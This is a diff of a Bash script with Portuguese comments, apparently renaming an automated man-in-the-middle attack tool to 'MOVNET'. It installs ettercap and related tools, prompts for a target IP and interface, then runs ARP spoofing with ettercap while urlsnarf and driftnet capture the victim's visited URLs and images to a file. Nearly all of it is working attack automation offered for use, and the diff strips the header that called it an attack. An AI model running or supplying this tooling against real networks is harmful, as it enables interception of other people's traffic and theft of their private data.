@@ -1,34 +1,11 @@
 #!/bin/bash
-#-------------------------------------------------------------------------------------------------------------
-#Automatização em coleta de informações na rede por ataque MAN-IN-THE-MIDDLE
-#
-#-------------------------------------------------------------------------------------------------------------
-#    Ao executar esse script ele iniciará uma busca das ferramentas essênciais
-#para a realização do ataque
-#    Em Seguida ele fará a instalação das mesmas, seguindo para a coleta dos dados
-#básicos para iniciar o ataque.
-#
-#Esse script está aberto a modificações quaisquer para a melhoria da coleta na execução do ataque
-#-------------------------------------------------------------------------------------------------------------
-#*********************************************INSTALAÇÂO******************************************************
-#    Para a execução do script basta dar permissão de execução ao script "install.sh" com "chmod +x install.sh"
-#em seguida executar esse script com ./install.sh
-#    Esses comandos darão as permissões necessárias para toda base de scripts envolvidos durante o ataque.
-#Nas execuções seguintes do script, basta iniciar com "mitm.sh"
-#-------------------------------------------------------------------------------------------------------------
-#**********************************************CRÉDITOS*******************************************************
-#Automatização desenvolvida por: @TH3K1LL4
-#
-#
-###############################################################################################################
-
-
 #--------------------------------------------------------------------------------------------------------------
                             #Verificação do tipo de usuário, se é root ou não.
 
 [ $(id -u) -ne 0 ] && { echo -e "root?"; sudo mitm.sh ; exit ;} || echo -e "Ok"
 #--------------------------------------------------------------------------------------------------------------
                            #aqui inicia a verificação de pacotes para instalação
+
 
 echo -e "Estamos analisando os pacotes necessários...\n"
 pacote=$(dpkg --get-selections | grep ettercap-text-only )
@@ -83,56 +60,59 @@ if [ -n "$pacote" ] ;
      sudo apt-get install dialog
 fi
 clear
+
 #--------------------------------------------------------------------------------------------------------------
-                                #aqui inicia a coleta de dados para o ataque
+                                #inicio da coleta de dados
 
 sleep 1
-figlet "         MITM ATTACK"
-echo -e "V 1.0\n"
-echo -e "Dev: Lucas Silva | Twitter: @gl1tc\n"
+figlet "         MOVNET"
+echo "                Movement On network"
+echo -e "Dev: @sysrogue\n"
 echo "------------------------------------------"
     echo
-    echo -n "Deseja localizar o IP do roteador s/n? "
+    echo -n "Localizar o IP do alvo, s/n? "
  read v0
 if [ "$v0" = s ] ;
  then 
     route
     echo "------------------------------------------"
     echo
-    echo "Insira o IP de seu roteador"
+    echo "Insira o IP do alvo."
     echo -n ">> " ;read IP
     echo "------------------------------------------"
     echo
    else
     echo
     echo "------------------------------------------"
-   echo "Insira o IP do roteador"
+   echo "Insira o IP do alvo"
     echo -n ">> " ;read IP
     echo "------------------------------------------"
     echo
 fi    
-     echo -n "Deseja inserir um alvo s/n? "
+    echo
+    echo "insira interface de rede utilizada"
+    echo -n ">>" ;read int
+    echo "------------------------------------------"
+     echo -n "Inserir host alvo, s/n? "
      read V
+
 #--------------------------------------------------------------------------------------------------------------
-                                      #aqui inicia o ataque "MITM"
+                                      #inicio do ataque MITM
 
 if [[ "$V" = s ]]; then
-      echo -n ">> " ; read alvo
-      rm -rf alvo.txt
-      xterm -e ettercap -T -q -i wlp3s0 -M arp:remote /$IP/$alvo/&
-      xterm -e urlsnarf -i wlp3s0 | grep $alvo > alvo.txt&
-      xterm alvo.sh&
-      driftnet -i wlp3s0
-      exit
+    echo -n ">> " ; read alvo
+    driftnet -i $int&
+    xterm -e ./alvo.sh&
+    xterm -e ettercap -T -q -i $int -M arp:remote /$IP//&
+    urlsnarf -i $int | grep $alvo > url.txt
 elif [[ "$V" = n ]]; then
-      rm -rf alvo.txt
-      xterm -e ettercap -T -q -i wlp3s0 -M arp:remote /$IP//&
-      xterm -e urlsnarf -i wlp3s0 > alvo.txt&
-      xterm alvo.sh&
-      driftnet -i wlp3s0
-      exit
+    driftnet -i $int&
+    xterm -e ./alvo.sh&
+    xterm -e ettercap -T -q -i $int -M arp:remote /$IP//&
+    urlsnarf -i $int > url.txt
 else
-  echo "Entrada desconhecida, deseja executar o ataque novamente s/n?"
+  echo "------------------------------------------"
+  echo "Entrada desconhecida, deseja executar o script novamente s/n?"
   echo -n ">>" ; read v1
   if [[ "$v1" = s ]]; then
     ./mitm.sh
